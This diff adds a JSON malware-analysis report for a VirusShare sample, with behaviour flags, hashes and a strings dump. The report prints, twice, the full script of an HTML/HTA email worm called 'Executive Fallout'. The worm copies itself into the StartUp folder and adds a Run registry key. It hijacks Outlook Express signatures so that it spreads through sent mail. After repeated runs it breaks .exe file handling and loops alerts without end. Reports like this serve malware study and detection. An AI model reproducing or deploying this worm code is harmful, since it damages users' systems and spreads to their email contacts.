@@ -1,0 +1,61 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Autoexec": "Runs when the Word document is opened",
+            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
+            "CopyFile": "May copy a file",
+            "CreateTextFile": "May create a text file",
+            "Exec": "May run an executable file or a system command using Excel 4 Macros",
+            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
+            "Run": "May run an executable file or a system command",
+            "System": "May run an executable file or a system command on a Mac",
+            "Windows": "May enumerate application windows",
+            "Write": "May write to a file",
+            "command": "May run PowerShell commands",
+            "open": "May open a file",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n<HTML><HEAD>\n<META content=\"text/html; charset=iso-8859-1\" http-equiv=Content-Type>\n<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR>\n<STYLE></STYLE>\n</HEAD>\n<BODY bgColor=#ffffff>\n<DIV><FONT face=Arial size=2>test</FONT></DIV>\n<DIV>\n<DIV style=\"POSITION: absolute; RIGHT: 0px; TOP: -20px; Z-INDEX: 5\">\n<OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC\nid=scr></OBJECT></DIV>\n<SCRIPT><!--\nfunction sE(){return true;}window.onerror=sE;scr.Reset();scr.doc=\"Z<HTML><HEAD><TITLE>.</\"+\"TITLE><HTA:APPLICATION ID=\\\\\\\"hO\\\\\\\" WINDOWSTATE=Minimize></\"+\"HEAD><BODY><object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></\"+\"object><script>fs=new ActiveXObject('Scripting.FileSystemObject');wc='C:\\\\\\\\Windows\\\\\\\\';ae='C:\\\\\\\\Autoexec.bat';f1=wc+'STARTM~1\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\Exec.hta';fl=fs.GetFolder(wc+'Applic~1\\\\\\\\Identities');sbf=fl.SubFolders;for(var mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new String(idd);idn=ids.slice(31);gt=wc+'System\\\\\\\\G6D9.fld';if(fs.FileExists(gt)){as=fs.OpenTextFile(gt,1);gh=as.ReadAll();as.close();as=fsOpenTextFile(gt,2);gh++;as.WriteLine(gh);as.close();}else{pol=fs.CreateTextFile(gt);pol.WriteLine('0');pol.close();fs.GetFile(gt).Attributes=2;gh=0;}f2=wc+'System\\\\\\\\exec.hta';if(fs.FileExists(f2)){}else{fs.CopyFile(f1,f2);fs.GetFile(f2).Attributes=2;}fr=wc+'exc.reg';reg=fs.CreateTextFile(fr);reg.WriteLine('REGEDIT4');reg.WriteBlankLines(1);reg.Writeline('[HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run]');reg.Writeline('\\\"Exec\\\"=\\\"C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System\\\\\\\\\\\\\\\\exec.hta\\\"');reg.WriteBlankLines(1);ky='[HKEY_CURRENT_USER\\\\\\\\Identities\\\\\\\\'+idn+'\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Outlook Express\\\\\\\\5.0';sg='\\\\\\\\signatures';reg.WriteLine(ky+sg+']');reg.Write('\\\"Default Signature\\\"=\\\"00000000\\\"');reg.WriteBlankLines(2); reg.WriteLine(ky+sg+'\\\\\\\\00000000]'); reg.WriteLine('\\\"name\\\"=\\\"My Signature\\\"');reg.WriteLine('\\\"type\\\"=dword:00000002'); reg.WriteLine('\\\"text\\\"=\\\"\\\"');reg.Write('\\\"file\\\"=\\\"C:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\Exc.htm\\\"'); reg.WriteBlankLines(2);reg.WriteLine(ky+']');reg.Write('\\\"Signature Flags\\\"=dword:00000003');reg.WriteBlankLines(2);reg.close();fs.GetFile(fr).Attributes=2;wsh.Run(wc+'Regedit.exe -s '+fr);if(gh==0){df=fs.OpenTextFile(ae,8);df.WriteLine('del '+f1);df.Close();}if(gh>9){b=fs.CreateTextFile(\\\"C:\\\\\\\\Windows\\\\\\\\execfall.reg\\\");b.WriteLine('REGEDIT4');b.WriteBlankLines(1);b.WriteLine('[HKEY_CLASSES_ROOT\\\\\\\\exefile\\\\\\\\shell\\\\\\\\open\\\\\\\\command]');b.WriteLine('@=\\\"C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\notepad.exe\\\"');b.Close();wsh.Run(wc+'Regedit.exe -s C:\\\\\\\\Windows\\\\\\\\execfall.reg');while(true){alert(\\\"Executive Fallout\\\");}}t3=fs.CreateTextFile(wc+'Exc.htm',1);fs.GetFile(wc+'Exc.htm').Attributes=2;t3.Write('<HTML><BODY><DIV style=\\\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\\\"><OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC id=scr></\"+\"OBJECT></\"+\"DIV>');t4=fs.OpenTextFile(f2,1);while(t4.Read(1)!='Z');t3.WriteLine('<SCRIPT><!--');t3.write('function sE(){return true;}window.onerror=sE;scr.Reset();scr.doc=\\\"Z');rs=t4.ReadAll();t4.close();rd=/\\\\\\\\/g;re=/\\\"/g;rf=/<\\\\//g;rt=rs.replace(rd,'\\\\\\\\\\\\\\\\').replace(re,'\\\\\\\\\\\"').replace(rf,'</\"+\"\\\"+\\\"');t3.WriteLine(rt+'\\\";la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language;scr.Path=(la==\\\"fr\\\")?\\\"C:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\Menu D\ufffdmarrer\\\\\\\\\\\\\\\\Programmes\\\\\\\\\\\\\\\\D\ufffdmarrage\\\\\\\\\\\\\\\\Exec.hta\\\":\\\"C:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\Start Menu\\\\\\\\\\\\\\\\Programs\\\\\\\\\\\\\\\\StartUp\\\\\\\\\\\\\\\\Exec.hta\\\";agt=navigator.userAgent.toLowerCase();if(((agt.indexOf(\\\"msie\\\")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf(\\\"msie 5.\\\")!=-1))scr.write();');t3.write('//--></\"+\"'+'SCRIPT></\"+\"'+'OBJECT></\"+\"'+'BODY></\"+\"'+'HTML>');t3.close();self.close();</\"+\"script>-MassMurderer</\"+\"BODY></\"+\"HTML>WW\";la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\windows\\\\Menu D\ufffdmarrer\\\\Programmes\\\\D\ufffdmarrage\\\\Exec.hta\":\"C:\\\\windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\Exec.hta\";agt=navigator.userAgent.toLowerCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf(\"msie 5.\")!=-1))scr.write();\n//--></SCRIPT>\n</OBJECT></DIV></BODY></HTML>\n"
+    },
+    "filename": "VirusShare_d2f827d06adf956ba38c626d492a13b6",
+    "filesize": 4301,
+    "filetype": "HTML document, ISO-8859 text, with very long lines, with CRLF line terminators",
+    "hashes": {
+        "md5": "d2f827d06adf956ba38c626d492a13b6",
+        "sha1": "f84976163ff8308ab6fa1f995b51fba88f4a74d0",
+        "sha256": "f2b9aa52410e1956e2d4b64fd207a53085bdcca2c1ec7eb2bb19c06209d99a5d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">",
+            "<HTML><HEAD>",
+            "<META content=\"text/html; charset=iso-8859-1\" http-equiv=Content-Type>",
+            "<META content=\"MSHTML 5.00.2614.3500\" name=GENERATOR>",
+            "<STYLE></STYLE>",
+            "</HEAD>",
+            "<BODY bgColor=#ffffff>",
+            "<DIV><FONT face=Arial size=2>test</FONT></DIV>",
+            "<DIV>",
+            "<DIV style=\"POSITION: absolute; RIGHT: 0px; TOP: -20px; Z-INDEX: 5\">",
+            "<OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC",
+            "id=scr></OBJECT></DIV>",
+            "<SCRIPT><!--",
+            "function sE(){return true;}window.onerror=sE;scr.Reset();scr.doc=\"Z<HTML><HEAD><TITLE>.</\"+\"TITLE><HTA:APPLICATION ID=\\\\\\\"hO\\\\\\\" WINDOWSTATE=Minimize></\"+\"HEAD><BODY><object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></\"+\"object><script>fs=new ActiveXObject('Scripting.FileSystemObject');wc='C:\\\\\\\\Windows\\\\\\\\';ae='C:\\\\\\\\Autoexec.bat';f1=wc+'STARTM~1\\\\\\\\Programs\\\\\\\\StartUp\\\\\\\\Exec.hta';fl=fs.GetFolder(wc+'Applic~1\\\\\\\\Identities');sbf=fl.SubFolders;for(var mye=new Enumerator(sbf);!mye.atEnd();mye.moveNext())idd=mye.item();ids=new String(idd);idn=ids.slice(31);gt=wc+'System\\\\\\\\G6D9.fld';if(fs.FileExists(gt)){as=fs.OpenTextFile(gt,1);gh=as.ReadAll();as.close();as=fsOpenTextFile(gt,2);gh++;as.WriteLine(gh);as.close();}else{pol=fs.CreateTextFile(gt);pol.WriteLine('0');pol.close();fs.GetFile(gt).Attributes=2;gh=0;}f2=wc+'System\\\\\\\\exec.hta';if(fs.FileExists(f2)){}else{fs.CopyFile(f1,f2);fs.GetFile(f2).Attributes=2;}fr=wc+'exc.reg';reg=fs.CreateTextFile(fr);reg.WriteLine('REGEDIT4');reg.WriteBlankLines(1);reg.Writeline('[HKEY_LOCAL_MACHINE\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Windows\\\\\\\\CurrentVersion\\\\\\\\Run]');reg.Writeline('\\\"Exec\\\"=\\\"C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\System\\\\\\\\\\\\\\\\exec.hta\\\"');reg.WriteBlankLines(1);ky='[HKEY_CURRENT_USER\\\\\\\\Identities\\\\\\\\'+idn+'\\\\\\\\Software\\\\\\\\Microsoft\\\\\\\\Outlook Express\\\\\\\\5.0';sg='\\\\\\\\signatures';reg.WriteLine(ky+sg+']');reg.Write('\\\"Default Signature\\\"=\\\"00000000\\\"');reg.WriteBlankLines(2); reg.WriteLine(ky+sg+'\\\\\\\\00000000]'); reg.WriteLine('\\\"name\\\"=\\\"My Signature\\\"');reg.WriteLine('\\\"type\\\"=dword:00000002'); reg.WriteLine('\\\"text\\\"=\\\"\\\"');reg.Write('\\\"file\\\"=\\\"C:\\\\\\\\\\\\\\\\WINDOWS\\\\\\\\\\\\\\\\Exc.htm\\\"'); reg.WriteBlankLines(2);reg.WriteLine(ky+']');reg.Write('\\\"Signature Flags\\\"=dword:00000003');reg.WriteBlankLines(2);reg.close();fs.GetFile(fr).Attributes=2;wsh.Run(wc+'Regedit.exe -s '+fr);if(gh==0){df=fs.OpenTextFile(ae,8);df.WriteLine('del '+f1);df.Close();}if(gh>9){b=fs.CreateTextFile(\\\"C:\\\\\\\\Windows\\\\\\\\execfall.reg\\\");b.WriteLine('REGEDIT4');b.WriteBlankLines(1);b.WriteLine('[HKEY_CLASSES_ROOT\\\\\\\\exefile\\\\\\\\shell\\\\\\\\open\\\\\\\\command]');b.WriteLine('@=\\\"C:\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\notepad.exe\\\"');b.Close();wsh.Run(wc+'Regedit.exe -s C:\\\\\\\\Windows\\\\\\\\execfall.reg');while(true){alert(\\\"Executive Fallout\\\");}}t3=fs.CreateTextFile(wc+'Exc.htm',1);fs.GetFile(wc+'Exc.htm').Attributes=2;t3.Write('<HTML><BODY><DIV style=\\\"POSITION:absolute;RIGHT:0px;TOP:-20px;Z-INDEX:5\\\"><OBJECT classid=clsid:06290BD5-48AA-11D2-8432-006008C3FBFC id=scr></\"+\"OBJECT></\"+\"DIV>');t4=fs.OpenTextFile(f2,1);while(t4.Read(1)!='Z');t3.WriteLine('<SCRIPT><!--');t3.write('function sE(){return true;}window.onerror=sE;scr.Reset();scr.doc=\\\"Z');rs=t4.ReadAll();t4.close();rd=/\\\\\\\\/g;re=/\\\"/g;rf=/<\\\\//g;rt=rs.replace(rd,'\\\\\\\\\\\\\\\\').replace(re,'\\\\\\\\\\\"').replace(rf,'</\"+\"\\\"+\\\"');t3.WriteLine(rt+'\\\";la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language;scr.Path=(la==\\\"fr\\\")?\\\"C:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\Menu Dmarrer\\\\\\\\\\\\\\\\Programmes\\\\\\\\\\\\\\\\Dmarrage\\\\\\\\\\\\\\\\Exec.hta\\\":\\\"C:\\\\\\\\\\\\\\\\windows\\\\\\\\\\\\\\\\Start Menu\\\\\\\\\\\\\\\\Programs\\\\\\\\\\\\\\\\StartUp\\\\\\\\\\\\\\\\Exec.hta\\\";agt=navigator.userAgent.toLowerCase();if(((agt.indexOf(\\\"msie\\\")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf(\\\"msie 5.\\\")!=-1))scr.write();');t3.write('//--></\"+\"'+'SCRIPT></\"+\"'+'OBJECT></\"+\"'+'BODY></\"+\"'+'HTML>');t3.close();self.close();</\"+\"script>-MassMurderer</\"+\"BODY></\"+\"HTML>WW\";la=(navigator.systemLanguage)?navigator.systemLanguage:navigator.language;scr.Path=(la==\"fr\")?\"C:\\\\windows\\\\Menu Dmarrer\\\\Programmes\\\\Dmarrage\\\\Exec.hta\":\"C:\\\\windows\\\\Start Menu\\\\Programs\\\\StartUp\\\\Exec.hta\";agt=navigator.userAgent.toLowerCase();if(((agt.indexOf(\"msie\")!=-1)&&(parseInt(navigator.appVersion)>4))||(agt.indexOf(\"msie 5.\")!=-1))scr.write();",
+            "//--></SCRIPT>",
+            "</OBJECT></DIV></BODY></HTML>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.360220",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
